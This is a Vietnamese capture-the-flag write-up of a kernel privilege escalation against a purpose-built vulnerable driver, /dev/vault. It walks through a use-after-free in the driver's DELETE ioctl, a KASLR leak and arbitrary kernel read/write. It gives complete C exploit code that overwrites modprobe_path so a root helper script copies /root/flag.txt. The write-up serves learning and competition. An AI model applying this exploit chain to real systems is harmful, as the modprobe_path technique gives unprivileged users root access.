## Phân tích

### Tìm attack surface

Kernel chưa strip nên có thể tìm driver bằng cách scan symbol:

```text
$ nm vmlinux | grep -i vault
ffffffff8156ef80 t vault_default_notify
ffffffff8156ef90 t vault_open
ffffffff8156efa0 t vault_ioctl
ffffffff8156f320 t vault_release
ffffffff829cdb40 d vault_dev
ffffffff82283e80 d vault_fops
ffffffff83015093 t vault_init
```

vault_init chỉ gọi misc_register(&vault_dev); miscdevice ở 0xffffffff829cdb40 có minor = MISC_DYNAMIC_MINOR và name = "vault", do đó node là /dev/vault (được devtmpfs tạo). open và release không làm gì; toàn bộ logic nằm trong vault_ioctl.

### Bề mặt ioctl

Disassemble vault_ioctl cho thấy sáu command và global table 16 entry:

| Command | Tên | Argument | Hành vi |
|---|---|---|---|
| 0x40085601 | CREATE | {u32 idx; u32 size;} | kmalloc(size) cho data buffer, kmalloc(0x20) cho entry; 1 <= size <= 0x1000; slot phải trống |
| 0x40045602 | DELETE | {u32 idx;} | kfree(entry->buf) rồi kfree(entry) |
| 0x40105603 | READ | {u32 idx; u32 size; u64 userptr;} | copy_to_user(userptr, entry->buf, size) |
| 0x40105604 | WRITE | {u32 idx; u32 size; u64 userptr;} | copy_from_user(entry->buf, userptr, size) |
| 0x40045605 | CALL | {u32 idx;} | entry->callback(entry->arg) |
| 0x80085606 | LEAK | u64 * | trả về &vault_ioctl |

READ và WRITE đều từ chối request lớn hơn size ghi nhận của entry; size vượt 0x7fffffff sẽ chạm ud2 trong hardened copy_* helper.

Layout entry:

```c
struct vault_entry {          /* kmalloc-32 */
    u64 callback;   /* 0x00  KEY ^ &vault_default_notify */
    u64 arg;        /* 0x08 */
    u64 size;       /* 0x10  zero-extended from the u32 ioctl argument */
    void *buf;      /* 0x18  kmalloc(size, GFP_KERNEL) */
};
static struct vault_entry *slots[16];   /* 0xffffffff8328c220 */
```

Callback bị obfuscate nhẹ với KEY = 0x6f6f56e06f2d7f60: CREATE lưu KEY ^ &vault_default_notify, còn CALL gọi KEY ^ entry->callback. vault_default_notify chỉ là no-op trả 0, nên CALL không làm gì nếu field chưa bị ghi đè — và UAF dưới đây cho phép ghi đè chính field đó.

### Bug

DELETE giải phóng cả hai allocation nhưng không xóa entry khỏi table:

```c
case VAULT_DELETE:
    if (idx > 15) return -EINVAL;
    e = slots[idx];
    if (!e) return -EINVAL;
    kfree(e->buf);
    kfree(e);          /* slots[idx] left dangling */
    return 0;
```

Đây là use-after-free (đồng thời double-free vì có thể gọi DELETE hai lần) trên entry 32 byte thuộc kmalloc-32. CREATE từ chối slot khác rỗng nên không thể làm mới dangling pointer — nhưng không cần.

### Từ dangling pointer tới arbitrary kernel R/W

Entry đã free là object kmalloc-32; data buffer của CREATE cũng dùng cùng allocator. SLUB per-CPU freelist hoạt động LIFO, nên buffer 32 byte tạo ngay sau lần free sẽ tái sử dụng đúng chunk dangling slot đang trỏ tới:

1. CREATE(0, 0x1000) — slot 0 nhận entry A và buffer 4 KB.
2. DELETE(0) — A->buf và A được free; slots[0] vẫn bằng A.
3. CREATE(1, 32) — data buffer 32 byte của slot 1 được cấp tại A; slots[0] và slots[1]->buf alias nhau.
4. WRITE(1, fake, 32) — ghi 32 byte attacker chọn vào A, tức fake entry mà slots[0] vẫn trỏ tới.
5. READ(0, ...) / WRITE(0, ...) — giờ slot 0 có size = 0x7fffffff và buf = target, nên ioctl chạy copy_* trên địa chỉ kernel tùy ý.

size = 0x7fffffff là giá trị lớn nhất trước ud2 guard, đủ cho mọi truy cập ở đây.

### KASLR

LEAK copy &vault_ioctl ra user space, nên slide = leak - 0x56efa0. Hai symbol cần dùng sau đó có offset cố định tính từ 0xffffffff81000000:

```text
vault_ioctl     0xffffffff8156efa0   (+0x56efa0)
modprobe_path   0xffffffff82851a60   (+0x1851a60)
```

## Khai thác

Toàn bộ chain: leak, dựng UAF, đổi modprobe_path trỏ tới shell script, rồi thực thi file có binary format không biết để kernel gọi helper dưới quyền root.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define DEV "/dev/vault"

#define IOCTL_CREATE 0x40085601UL
#define IOCTL_DELETE 0x40045602UL
#define IOCTL_READ   0x40105603UL
#define IOCTL_WRITE  0x40105604UL
#define IOCTL_LEAK   0x80085606UL

#define OFF_VAULT_IOCTL 0x56efa0ULL
#define OFF_MODPROBE    0x1851a60ULL

static int fd = -1;

struct req  { uint32_t idx; uint32_t size; uint64_t ptr; };
struct creq { uint32_t idx; uint32_t size; };

static int vcreate(int idx, uint32_t size) {
    struct creq c; c.idx = idx; c.size = size;
    return ioctl(fd, IOCTL_CREATE, &c);
}
static int vdelete(int idx) {
    uint32_t i = idx;
    return ioctl(fd, IOCTL_DELETE, &i);
}
static int vread(int idx, void *buf, uint32_t size) {
    struct req r; r.idx = idx; r.size = size; r.ptr = (uint64_t)buf;
    return ioctl(fd, IOCTL_READ, &r);
}
static int vwrite(int idx, const void *buf, uint32_t size) {
    struct req r; r.idx = idx; r.size = size; r.ptr = (uint64_t)buf;
    return ioctl(fd, IOCTL_WRITE, &r);
}

/* Overwrite the chunk slot 0 dangles on with a fake vault_entry. */
static void set_fake(uint64_t target) {
    uint64_t fake[4] = { 0, 0, 0x7fffffffULL, target };
    if (vwrite(1, fake, 32) != 0) { perror("vwrite fake"); exit(1); }
}
static void arb_read(uint64_t addr, void *dst, uint32_t n) {
    set_fake(addr);
    if (vread(0, dst, n) != 0) { perror("arb_read"); exit(1); }
}
static void arb_write(uint64_t addr, const void *src, uint32_t n) {
    set_fake(addr);
    if (vwrite(0, src, n) != 0) { perror("arb_write"); exit(1); }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] uid=%d\n", getuid());

    fd = open(DEV, O_RDWR);
    if (fd < 0) { perror("open " DEV); return 1; }

    uint64_t leak = 0;
    if (ioctl(fd, IOCTL_LEAK, &leak) != 0) { perror("leak"); return 1; }
    uint64_t kbase = leak - OFF_VAULT_IOCTL;
    uint64_t modprobe = kbase + OFF_MODPROBE;
    printf("[+] vault_ioctl = %#lx, base = %#lx\n",
           (unsigned long)leak, (unsigned long)kbase);

    /* Stage the UAF: slot 0 dangles on a freed kmalloc-32 entry, then a
       32-byte data buffer is allocated on top of that same chunk. */
    if (vcreate(0, 0x1000) != 0) { perror("create0"); return 1; }
    if (vdelete(0) != 0) { perror("delete0"); return 1; }
    if (vcreate(1, 32) != 0) { perror("create1"); return 1; }

    char chk[32] = {0};
    arb_read(modprobe, chk, 16);
    printf("[+] modprobe_path = %#lx currently '%s'\n",
           (unsigned long)modprobe, chk);

    arb_write(modprobe, "/tmp/x", 7);
    memset(chk, 0, sizeof(chk));
    arb_read(modprobe, chk, 16);
    printf("[+] modprobe_path now '%s'\n", chk);

    /* Helper runs as root; drop the flag where user can read it. */
    system("printf '#!/bin/sh\ncat /root/flag.txt > /tmp/flag\nchmod 666 /tmp/flag\n' > /tmp/x");
    chmod("/tmp/x", 0777);

    /* Unknown binary format -> request_module("binfmt-ffff") -> modprobe. */
    int f = open("/tmp/dummy", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (f >= 0) { write(f, "\xff\xff\xff\xff", 4); close(f); }
    chmod("/tmp/dummy", 0777);

    pid_t p = fork();
    if (p == 0) {
        char *argv[] = { "/tmp/dummy", NULL };
        char *envp[] = { NULL };
        execve("/tmp/dummy", argv, envp);
        _exit(0);
    }
    int st; waitpid(p, &st, 0);
    sleep(1);

    printf("[*] --- flag ---\n");
    system("cat /tmp/flag 2>/dev/null; cat /root/flag.txt 2>/dev/null");
    printf("\n[*] done, uid=%d\n", getuid());
    return 0;
}
```

### Đưa exploit lên remote

Service cấp một VM mới cho mỗi TCP connection, nên phải upload và chạy payload trong cùng session. Để giảm dung lượng, cùng logic được biên dịch lại không dùng libc (-nostdlib, raw syscall) rồi đóng gói gzip+base64 (1.6 KB):

```sh
gcc -Os -static -nostdlib -ffreestanding -fno-builtin -fno-stack-protector \
    -fno-pie -no-pie -o exp exp.c
gzip -9 -c exp | base64 -w76 > exp.b64
```

### Ghi chú

- Trường size của _IOW trong CREATE là 8 (hai u32), nên request là 0x40085601, không phải 0x40045601. Gửi sai giá trị trả ENOTTY và dễ tưởng driver không hoạt động.
- SMEP bật nhưng không ảnh hưởng vì không hijack control flow; primitive chỉ truy cập dữ liệu.
- Fake entry cũng có thể dùng cho CALL (callback = KEY ^ target, arg truyền trong rdi) để gọi gián tiếp một lần; tuy vậy arbitrary read/write linh hoạt hơn.
